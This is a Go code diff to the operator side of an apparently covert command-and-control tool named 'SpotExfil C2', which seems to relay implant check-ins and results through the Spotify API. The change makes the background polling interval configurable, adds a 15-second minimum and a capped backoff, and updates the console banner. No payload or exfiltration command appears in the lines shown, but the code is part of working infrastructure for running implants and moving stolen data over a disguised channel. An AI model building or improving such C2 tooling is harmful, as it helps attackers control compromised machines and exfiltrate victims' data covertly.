@@ -34,16 +34,21 @@ type Operator struct {
 	connectedClients map[string]ClientInfo  // client_id -> info
 	pollBackoff      time.Duration         // 0 = normal, >0 = rate limited
 	lastPoll         time.Time             // timestamp of last successful poll
+	pollInterval     time.Duration         // background poll interval
 }
 
 // NewOperator creates a new operator.
-func NewOperator(client *spotify.Client, key string) *Operator {
+func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Operator {
+	if pollIntervalSec < 15 {
+		pollIntervalSec = 15
+	}
 	return &Operator{
 		client:           client,
 		key:              key,
 		nextSeq:          1,
 		pendingSeqs:      make(map[int]string),
 		connectedClients: make(map[string]ClientInfo),
+		pollInterval:     time.Duration(pollIntervalSec) * time.Second,
 	}
 }
 
@@ -170,8 +175,7 @@ func (op *Operator) checkForCheckins() bool {
 // startBackgroundPoller runs a goroutine that continuously polls
 // for new checkins and results, with smart backoff.
 func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
-	baseInterval := 20 * time.Second
-	interval := baseInterval
+	interval := op.pollInterval
 
 	for {
 		select {
@@ -187,10 +191,12 @@ func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
 
 			found := op.checkForCheckins()
 			if found {
-				interval = baseInterval
+				interval = op.pollInterval
 			} else {
-				if interval < 60*time.Second {
-					interval = interval + 5*time.Second
+				// Gradual backoff, max 2x configured interval
+				maxInterval := op.pollInterval * 2
+				if interval < maxInterval {
+					interval = interval + 10*time.Second
 				}
 			}
 		}
@@ -200,7 +206,8 @@ func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
 // Interactive runs the interactive operator console.
 func (op *Operator) Interactive() {
 	fmt.Println("SpotExfil C2 Operator Console")
-	fmt.Println("Type 'help' for available commands.\n")
+	fmt.Printf("Polling every %ds. Type 'help' for commands.\n\n",
+		int(op.pollInterval.Seconds()))
 
 	// Initial check for pending checkins
 	op.checkForCheckins()
